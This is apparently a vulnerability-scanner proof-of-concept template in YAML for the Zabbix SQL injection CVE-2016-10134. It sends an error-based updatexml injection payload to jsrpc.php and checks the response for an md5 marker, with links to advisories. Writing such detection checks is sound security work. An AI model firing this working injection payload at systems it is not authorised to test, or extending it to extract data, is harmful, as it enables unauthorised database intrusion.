name: yaml-poc-zabbix-zabbix-sql_injection-CVE-2016-10134
binding: b2ef22bf-852e-4689-a22a-d1a77bba881e
detail:
    author: system_user
    links:
        - http://www.debian.org/security/2017/dsa-3802
        - http://www.openwall.com/lists/oss-security/2017/01/12/4
        - http://www.openwall.com/lists/oss-security/2017/01/13/4
        - http://www.securityfocus.com/bid/95423
        - https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=850936
        - https://code610.blogspot.com/2017/10/zbx-11023-quick-autopsy.html
        - https://support.zabbix.com/browse/ZBX-11023
    vulnerability:
        id: 15c077ed-d43e-422c-ad69-59289c84da2f
        level: high
transport: http
set:
    r: randomInt(2000000000, 2100000000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,md5({{r}})),0)
            follow_redirects: true
        expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(r)), 0, 31)))
expression: r0()
